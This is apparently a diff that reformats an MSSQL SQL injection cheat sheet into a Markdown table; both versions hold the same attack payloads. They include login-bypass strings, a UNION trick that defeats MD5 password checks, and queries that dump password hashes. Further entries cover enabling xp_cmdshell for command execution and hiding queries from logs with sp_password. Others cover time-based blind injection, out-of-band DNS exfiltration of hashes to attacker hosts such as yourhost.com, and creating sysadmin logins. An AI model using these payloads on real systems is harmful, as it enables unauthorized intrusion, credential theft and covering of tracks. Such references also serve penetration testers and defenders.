@@ -1,327 +1,201 @@
-MSSQL 
+#### MSSQL 
 
-Query Command
-
-Version - SELECT @@VERSION;
-- This command obtains the OS/Windows version of the
-system.
-
-List Users - SELECT name FROM master..syslogins;
-- This command lists the names of users from the table master..syslogins.
-
-Current User - SELECT user_name();
-- This command obtains a name of recently logged in user.
-
-SELECT system_user;
-- This command obtains the current value of system_user.
-
-SELECT user;
-- This command obtains the name of impersonated user.
-
-SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID;
-- This command obtains the column name loginame from table master..sysprocesses having spid=@@SPID.
-
-List all Database
-
-SELECT name FROM master..sysdatabases;
-— This command obtains the list of all the databases from
-database ‘master..sysdatabases’.
-SELECT DB_NAME(N);
-— This command obtains the DB_NAME present at N (Where N=0,1,2,3, …).
-
-Current Database
-SELECT DB_NAME();
-— This command obtains the current database.
-
-List Tables
-SELECT name FROM sysobjects WHERE xtype = 'U';
-— This command obtains the column ‘name’ from table sysobjects having xtype value ‘U’.
-
-Column Names
-SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')
-— This command works only for reading current database’s
-
-tables.
-SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';
-— This command works globally. But you should change the master with the DB name which holds the table you want to read the columns and change ‘sometable’ with the table name.
-
-Select Nth Row
-SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC;
-— This command obtains 9th row.
-
-Select Nth Char
-SELECT substring(‘abcd’, 3, 1);
-—This command returns c.
-
-If Statement
-IF (1=1) SELECT 1 ELSE SELECT 2;
-—This command returns 1.
-
-Case Statement
-SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END;
-—This command returns 1.
-
-Comments
-SELECT 1;
-— This command is used for writing a comment.
-
-SELECT /*comment*/1;
-— This command is used to comment out a statement.
-
-String without Quotes
-SELECT CHAR(75)+CHAR(76)+CHAR(77);
-— This command returns ‘KLM’.
-
-Time Delay
-WAITFOR DELAY ’0:0:5′;
-— This command is used to pause for 5 seconds.
-
-Command Execution
-EXEC xp_cmdshell ‘net user’;
-— privOn MSSQL 2005, and you may need to reactivate xp_cmdshell first as it’s disabled by default:
-
-EXEC sp_configure ‘show advanced options’, 1; 
-— priv 
-
-RECONFIGURE; 
-— priv
-
-EXEC sp_configure ‘xp_cmdshell’, 1; 
-— priv
-
-RECONFIGURE; 
-— priv
-
-Make DNS Requests
-
-declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’);
-— These commands are used to make DNS request.
-
-declare @host varchar(800); select @host = name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + ‘c$boot.ini”’);
-— These commands are used to make DNS request.
-— NB: Concatenation is not allowed in calls to these SPs, hence you have to use @host.
-
-Bypassing Login Screens
-
-SQL Injection, Login tricks
-admin' --
-admin' #
-admin'/*
-' or 1=1—
-' or 1=1#
-' or 1=1/*
-') or '1'='1—
-') or ('1'='1--
-
-Bypassing second MD5 hash check login screens
-If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.
-
-Username : admin
-Password : 1234 ' AND 1=0 UNION ALL SELECT 'admin',
-'81dc9bdb52d04dc20036dbd8313ed055
-81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)
-
-Union Injections
-SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members
-— With union you can do SQL queries cross-table. Basically you
+Query | Command
+------| ------
+Version | SELECT @@VERSION;
+ . | This command obtains the OS/Windows version of the system.
+List Users | SELECT name FROM master..syslogins;
+ . | This command lists the names of users from the table master..syslogins.
+Current User | SELECT user_name();
+. | This command obtains a name of recently logged in user.
+. | SELECT system_user;
+. | - This command obtains the current value of system_user.
+. | SELECT user;
+. | - This command obtains the name of impersonated user.
+. | SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID;
+. | - This command obtains the column name loginame from table master..sysprocesses having spid=@@SPID.
+List all Database | SELECT name FROM master..sysdatabases;
+. | - This command obtains the list of all the databases from database ‘master..sysdatabases’.
+. | SELECT DB_NAME(N);
+. | - This command obtains the DB_NAME present at N (Where N=0,1,2,3, …).
+Current Database | SELECT DB_NAME();
+. | — This command obtains the current database.
+List Tables | SELECT name FROM sysobjects WHERE xtype = 'U';
+. | — This command obtains the column ‘name’ from table sysobjects having xtype value ‘U’.
+Column Names | SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')
+. | - This command works only for reading current database’s tables.
+. | SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';
+. | - This command works globally. But you should change the master with the DB name which holds the table you want to read the columns and change ‘sometable’ with the table name.
+Select Nth Row | SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC;
+. | - This command obtains 9th row.
+Select Nth Char | SELECT substring(‘abcd’, 3, 1);
+. | - This command returns c.
+If Statement |  IF (1=1) SELECT 1 ELSE SELECT 2;
+. | -This command returns 1.
+Case Statement | SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END;
+. | - This command returns 1.
+Comments | SELECT 1;
+. | - This command is used for writing a comment.
+. | SELECT /*comment*/1;
+. | - This command is used to comment out a statement.
+String without Quotes | SELECT CHAR(75)+CHAR(76)+CHAR(77);
+. | - This command returns ‘KLM’.
+Time Delay | WAITFOR DELAY ’0:0:5′;
+. | - This command is used to pause for 5 seconds.
+Command Execution | EXEC xp_cmdshell ‘net user’;
+. | - priv 
+. | On MSSQL 2005, and you may need to reactivate xp_cmdshell first as it’s disabled by default:
+. | EXEC sp_configure ‘show advanced options’, 1; 
+. | - priv 
+. | RECONFIGURE; 
+. | - priv
+. | EXEC sp_configure ‘xp_cmdshell’, 1; 
+. | - priv
+. | RECONFIGURE; 
+. | - priv
+Make DNS Requests | declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’);
+. | - These commands are used to make DNS request.
+. | declare @host varchar(800); select @host = name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + ‘c$boot.ini”’);
+. | - These commands are used to make DNS request.
+. | - NB: Concatenation is not allowed in calls to these SPs, hence you have to use @host.
+Bypassing Login Screens | .
+SQL Injection, Login tricks | .
+. | admin' --
+. | admin' #
+. | admin'/*
+. | ' or 1=1—
+. | ' or 1=1#
+. | ' o r 1=1/*
+. | ') or '1'='1—
+. | ') or ('1'='1--
+Bypassing second MD5 hash check login screens | If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.
+. | Username : admin
+. | Password : 1234 ' AND 1=0 UNION ALL SELECT 'admin',
+. | '81dc9bdb52d04dc20036dbd8313ed055
+. | 81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)
+Union Injections | SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members
+. | - With union you can do SQL queries cross-table. Basically you
 can poison query to return records from another table. This
 above example will combine results from both news table and
 members table and return all of them.
-Another Example:
-' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
-
-log in as admin user
-DROP sampletable;--
-DROP sampletable;#
-Username: admin'--
-SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
-— Using this command, you can log in as admin user.
-
-List Passwords
-SELECT name, password FROM master..sysxlogins;
-— This command obtains the columns ‘name’ and ‘password’ from the table ‘master..sysxlogins’. It works only in MSSQL 2000.
-
-SELECT name, password_hash FROM master.sys.sql_logins;
-— This command obtains the columns ‘name’ and ‘password_hash’ from the table ‘master.sys.sql_logins’. It works only in MSSQL 2005.
-
-List Password Hashes
-SELECT name, password FROM master..sysxlogins
-— This command obtains the columns ‘name’ and ‘password’
-
-from the table ‘master..sysxlogins’.
-— priv, mssql 2000.
-
-SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
-— This command obtains the columns ‘name’ and
-
-‘master.dbo.fn_varbintohexstr(password)’ from the table ‘master..sysxlogins’.
-— priv, mssql 2000, Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.
-
-SELECT name, password_hash FROM master.sys.sql_logins
-— This command obtains the columns ‘name’ and ‘password_hash’ from the table ‘master.sys.sql_logins’.
-— priv, mssql 2005.
-
-SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
-— This command obtains the columns ‘name + ‘-’ + master.sys.fn_varbintohexstr(password_hash)’ from the table ‘master.sys.sql_logins’.
-— priv, mssql 2005.
-
-Covering Tracks
-SQL Server don't log queries which includes sp_password for
-security reasons(!). So if you add --sp_password to your queries
-it will not be in SQL Server logs (of course still will be in web
-server logs, try to use POST if it's possible)
-Insert a file content to a table. If you don't know internal path of
-web application, you can read IIS (IIS 6 only) metabase
-file(%systemroot%\system32\inetsrv\MetaBase.xml) and then
-search in it to identify application path.
-Create table foo( line varchar(8000) );
-bulk insert foo from 'c:\inetpub\wwwroot\login.asp';
-Drop temp table; and repeat for another file
-
-Create Users
-EXEC sp_addlogin 'user', 'pass';
-— This command creates a new SQL Server login where username is ‘user’ and password is ‘pass’.
-
-Drop User
-EXEC sp_droplogin 'user';
-— This command drops a username = ‘user’ from SQL Server login.
-
-Make User DBA
-EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
-— This command makes a ‘user’ DBA.
-
-Local File Access
-CREATE TABLE mydata (line varchar(8000));
-BULK INSERT mydata FROM ‘c:boot.ini’;
-DROP TABLE mydata;
-— This command is used to gain Local File Access.
-
-Hostname, IP Address
-SELECT HOST_NAME();
-— This command obtains the Hostname and IP address of a system.
-
-Error Based SQLi attack: To throw conversion errors.
-For integer inputs: convert(int,@@version);
-For string inputs: ‘ + convert(int,@@version) +’;
-
-Clear SQLi Tests: For Boolean SQL injection and silent attacks
-product.asp?id=4;
-product.asp?id=5-1;
-product.asp?id=4 OR 1=1;
-— These commands can be used as tests for Boolean SQL
-
-injection and silent attacks. Error Messages
-SELECT * FROM master..sysmessages;
-— This command retrieves all the errors messages present in the SQL server.
-
-Linked Servers
-SELECT * FROM master..sysservers;
-— This command retrieves all the Linked Servers.
-?vulnerableParam=1;DECLARE @x as int;DECLARE @w as char(6);SET @x=ASCII(SUBSTRING(({INJECTION}),1,1));IF @x=100 SET @w='0:0:14' ELSE SET @w='0:0:01';WAITFOR DELAY @w— {INJECTION} = You want to run the query.
-— If the condition is true, will response after 14 seconds. If is false, will be delayed for one second.
-
-Out of Band Channel
-?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECT})+'.yourhost.com';'sa';'pwd', 'SELECT 1'); 
-— This command makes DNS resolution request to {INJECT}.yourhost.com.
-?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECT})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q
-— This command makes DNS resolution request to {INJECT}.yourhost.com.
-— {INJECTION} = You want to run the query.
-
-Default Databases
-Northwind
-Model
-Sdb
-pubs — not on sql server 2005
-tempdb
-
-Path of DB files
-%PROGRAM_FILES%\Microsoft SQL
-Server\MSSQL.1\MSSQL\Data\
-
-Location of DB Files
-EXEC sp_helpdb master;
-— This command retrieves the location of master.mdf.
-
-EXEC sp_helpdb pubs;
-— This command retrieves the location of pubs.mdf. 
-
-privileges Current privs on a particular object in 2005, 2008
-SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’);
-— This command returns a column name ‘permission_name’ from the table ‘master..fn_my_permissions’ where securable is set to ‘null’ and securable_class permission is set to current ‘DATABASE’.
-
-SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’);
-— This command returns a column name ‘permission_name’
-
-from the table ‘master..fn_my_permissions’ where securable is set to ‘null’ and securable_class permission is set to current ‘SERVER’.
-
-SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’);
-— This command returns a column name ‘permission_name’
-
-from the table ‘master..fn_my_permissions’ where securable is set to ‘master..syslogins’ and securable_class permission is set to current ‘OBJECT’.
-SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);
-— This command returns a column name ‘permission_name’
-
-from the table ‘master..fn_my_permissions’ where securable is set to ‘sa’ and securable_class permissions are set on a ‘USER’.
-— current privs in 2005, 2008
-
-SELECT is_srvrolemember(‘sysadmin’);
-— This command determines whether a current has ‘sysadmin’ privilege.
-
-SELECT is_srvrolemember(‘dbcreator’);
-— This command determines whether a current has ‘dbcreator’ privilege.
-
-SELECT is_srvrolemember(‘bulkadmin’);
-— This command determines whether a current has ‘bulkadmin’ privilege.
-
-SELECT is_srvrolemember(‘diskadmin’);
-— This command determines whether a current has ‘diskadmin’ privilege.
-
-SELECT is_srvrolemember(‘processadmin’);
-— This command determines whether a current has ‘processadmin’ privilege.
-
-SELECT is_srvrolemember(‘serveradmin’);
-— This command determines whether a current has ‘serveradmin’ privilege.
-
-SELECT is_srvrolemember(‘setupadmin’);
-— This command determines whether a current has ‘setupadmin’ privilege.
-
-SELECT is_srvrolemember(‘securityadmin’);
-— This command determines whether a current has ‘securityadmin’ privilege.
-
-SELECT name FROM master..syslogins WHERE denylogin = 0;
-— This command obtains column name ‘name’ from table master..syslogins having denylogin value as 0.
-
-SELECT name FROM master..syslogins WHERE hasaccess = 1;
-— This command obtains column name ‘name’ from table master..syslogins having hasaccess value as 1.
-
-SELECT name FROM master..syslogins WHERE isntname = 0;
-— This command obtains column name ‘name’ from table master..syslogins having isntname value as 0.
-
-SELECT name FROM master..syslogins WHERE isntgroup = 0;
-— This command obtains column name ‘name’ from table master..syslogins having isntgroup value as 0.
-
-SELECT name FROM master..syslogins WHERE sysadmin = 1;
-— This command obtains column name ‘name’ from table master..syslogins having sysadmin value as 1.
-
-SELECT name FROM master..syslogins WHERE securityadmin = 1;
-— This command obtains column name ‘name’ from table master..syslogins having securityadmin value as 1.
-
-SELECT name FROM master..syslogins WHERE serveradmin = 1;
-— This command obtains column name ‘name’ from table master..syslogins having serveradmin value as 1.
-
-SELECT name FROM master..syslogins WHERE setupadmin = 1;
-— This command obtains column name ‘name’ from table master..syslogins having setupadmin value as 1.
-
-SELECT name FROM master..syslogins WHERE processadmin = 1;
-— This command obtains column name ‘name’ from table master..syslogins having processadmin value as 1.
-
-SELECT name FROM master..syslogins WHERE diskadmin = 1;
-— This command obtains column name ‘name’ from table master..syslogins having diskadmin value as 1.
-
-SELECT name FROM master..syslogins WHERE dbcreator = 1;
-— This command obtains column name ‘name’ from table master..syslogins having dbcreator value as 1.
-SELECT name FROM master..syslogins WHERE bulkadmin = 1;
-— This command obtains column name ‘name’ from table master..syslogins having bulkadmin value as 1.
+Another Example: | ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+log in as admin user | .
+. | DROP sampletable;--
+. | DROP sampletable;#
+. | Username: admin'--
+. | SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
+. | - Using this command, you can log in as admin user.
+List Passwords | SELECT name, password FROM master..sysxlogins;
+. | - This command obtains the columns ‘name’ and ‘password’ from the table ‘master..sysxlogins’. It works only in MSSQL 2000.
+. | SELECT name, password_hash FROM master.sys.sql_logins;
+. | - This command obtains the columns ‘name’ and ‘password_hash’ from the table ‘master.sys.sql_logins’. It works only in MSSQL 2005.
+List Password Hashes | SELECT name, password FROM master..sysxlogins
+. | - this command obtains the columns ‘name’ and ‘password’
+. | from the table ‘master..sysxlogins’.
+. | - priv, mssql 2000.
+. | SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
+. | - This command obtains the columns ‘name’ and ‘master.dbo.fn_varbintohexstr(password)’ from the table ‘master..sysxlogins’.
+. | - priv, mssql 2000, Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.
+. | SELECT name, password_hash FROM master.sys.sql_logins
+. | - This command obtains the columns ‘name’ and ‘password_hash’ from the table ‘master.sys.sql_logins’.
+. | - priv, mssql 2005.
+. | SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
+. | - this command obtains the columns ‘name + ‘-’ + master.sys.fn_varbintohexstr(password_hash)’ from the table ‘master.sys.sql_logins’.
+. | - priv, mssql 2005.
+Covering Tracks | SQL Server don't log queries which includes sp_password for security reasons(!). So if you add --sp_password to your queries it will not be in SQL Server logs (of course still will be in web server logs, try to use POST if it's possible) Insert a file content to a table. If you don't know internal path of web application, you can read IIS (IIS 6 only) metabase file(%systemroot%\system32\inetsrv\MetaBase.xml) and then search in it to identify application path. Create table foo( line varchar(8000) ); bulk insert foo from 'c:\inetpub\wwwroot\login.asp'; Drop temp table; and repeat for another file
+Create Users | EXEC sp_addlogin 'user', 'pass';
+. | - This command creates a new SQL Server login where username is ‘user’ and password is ‘pass’.
+Drop User | EXEC sp_droplogin 'user';
+. | - This command drops a username = ‘user’ from SQL Server login.
+Make User DBA | EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
+. | - This command makes a ‘user’ DBA.
+Local File Access | CREATE TABLE mydata (line varchar(8000));
+. | BULK INSERT mydata FROM ‘c:boot.ini’;
+. | DROP TABLE mydata;
+. | - This command is used to gain Local File Access.
+Hostname, IP Address | SELECT HOST_NAME();
+. | - This command obtains the Hostname and IP address of a system.
+Error Based SQLi attack: To throw conversion errors. | For integer inputs: convert(int,@@version);
+. | For string inputs: ‘ + convert(int,@@version) +’;
+Clear SQLi Tests: For Boolean SQL injection and silent attacks | product.asp?id=4;
+. | product.asp?id=5-1;
+. | product.asp?id=4 OR 1=1;
+. | - These commands can be used as tests for Boolean SQL
+injection and silent attacks. Error Messages | SELECT * FROM master..sysmessages;
+. | - This command retrieves all the errors messages present in the SQL server.
+Linked Servers | SELECT * FROM master..sysservers;
+. | - This command retrieves all the Linked Servers.
+. | ?vulnerableParam=1;DECLARE @x as int;DECLARE @w as char(6);SET @x=ASCII(SUBSTRING(({INJECTION}),1,1));IF @x=100 SET @w='0:0:14' ELSE SET @w='0:0:01';WAITFOR DELAY @w— {INJECTION} = You want to run the query.
+. | - If the condition is true, will response after 14 seconds. If is false, will be delayed for one second.
+Out of Band Channel | ?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECT})+'.yourhost.com';'sa';'pwd', 'SELECT 1'); 
+. | - This command makes DNS resolution request to {INJECT}.yourhost.com.
+. | ?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECT})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q
+. | - This command makes DNS resolution request to {INJECT}.yourhost.com.
+. | - {INJECTION} = You want to run the query.
+Default Databases | Northwind
+. | Model
+. | Sdb
+. | pubs — not on sql server 2005
+. | tempdb
+Path of DB files | %PROGRAM_FILES%\Microsoft SQL
+. | Server\MSSQL.1\MSSQL\Data\
+Location of DB Files | EXEC sp_helpdb master;
+. | - This command retrieves the location of master.mdf.
+. | EXEC sp_helpdb pubs;
+. | - This command retrieves the location of pubs.mdf. 
+privileges | .
+Current privs on a particular object in 2005, 2008 | SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’);
+. | - This command returns a column name ‘permission_name’ from the table ‘master..fn_my_permissions’ where securable is set to ‘null’ and securable_class permission is set to current ‘DATABASE’.
+. | SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’);
+. | - This command returns a column name ‘permission_name’
+. | from the table ‘master..fn_my_permissions’ where securable is set to ‘null’ and securable_class permission is set to current ‘SERVER’.
+. | SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’);
+. | - This command returns a column name ‘permission_name’
+. | from the table ‘master..fn_my_permissions’ where securable is set to ‘master..syslogins’ and securable_class permission is set to current ‘OBJECT’.
+. | SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);
+. | - This command returns a column name ‘permission_name’
+. | from the table ‘master..fn_my_permissions’ where securable is set to ‘sa’ and securable_class permissions are set on a ‘USER’.
+. | - current privs in 2005, 2008
+. | SELECT is_srvrolemember(‘sysadmin’);
+. | - This command determines whether a current has ‘sysadmin’ privilege.
+. | SELECT is_srvrolemember(‘dbcreator’);
+. | - This command determines whether a current has ‘dbcreator’ privilege.
+. | SELECT is_srvrolemember(‘bulkadmin’);
+. | -This command determines whether a current has ‘bulkadmin’ privilege.
+. | SELECT is_srvrolemember(‘diskadmin’);
+. | - This command determines whether a current has ‘diskadmin’ privilege.
+. | SELECT is_srvrolemember(‘processadmin’);
+. | - This command determines whether a current has ‘processadmin’ privilege.
+. | SELECT is_srvrolemember(‘serveradmin’);
+. | - This command determines whether a current has ‘serveradmin’ privilege.
+. | SELECT is_srvrolemember(‘setupadmin’);
+. | - This command determines whether a current has ‘setupadmin’ privilege.
+. | SELECT is_srvrolemember(‘securityadmin’);
+. | - This command determines whether a current has ‘securityadmin’ privilege.
+. | SELECT name FROM master..syslogins WHERE denylogin = 0;
+. | -This command obtains column name ‘name’ from table master..syslogins having denylogin value as 0.
+. | SELECT name FROM master..syslogins WHERE hasaccess = 1;
+. | - This command obtains column name ‘name’ from table master..syslogins having hasaccess value as 1.
+. | SELECT name FROM master..syslogins WHERE isntname = 0;
+. | - This command obtains column name ‘name’ from table master..syslogins having isntname value as 0.
+. | SELECT name FROM master..syslogins WHERE isntgroup = 0;
+. | - This command obtains column name ‘name’ from table master..syslogins having isntgroup value as 0.
+. | SELECT name FROM master..syslogins WHERE sysadmin = 1;
+. | - This command obtains column name ‘name’ from table master..syslogins having sysadmin value as 1.
+. | SELECT name FROM master..syslogins WHERE securityadmin = 1;
+. | - This command obtains column name ‘name’ from table master..syslogins having securityadmin value as 1.
+. | SELECT name FROM master..syslogins WHERE serveradmin = 1;
+. | - This command obtains column name ‘name’ from table master..syslogins having serveradmin value as 1.
+. | SELECT name FROM master..syslogins WHERE setupadmin = 1;
+. | - This command obtains column name ‘name’ from table master..syslogins having setupadmin value as 1.
+. | SELECT name FROM master..syslogins WHERE processadmin = 1;
+. | - This command obtains column name ‘name’ from table master..syslogins having processadmin value as 1.
+. | SELECT name FROM master..syslogins WHERE diskadmin = 1;
+. | - This command obtains column name ‘name’ from table master..syslogins having diskadmin value as 1.
+. | SELECT name FROM master..syslogins WHERE dbcreator = 1;
+. | - This command obtains column name ‘name’ from table master..syslogins having dbcreator value as 1.
+. | SELECT name FROM master..syslogins WHERE bulkadmin = 1;
+. | - This command obtains column name ‘name’ from table master..syslogins having bulkadmin value as 1.
 
 MYSQL
 
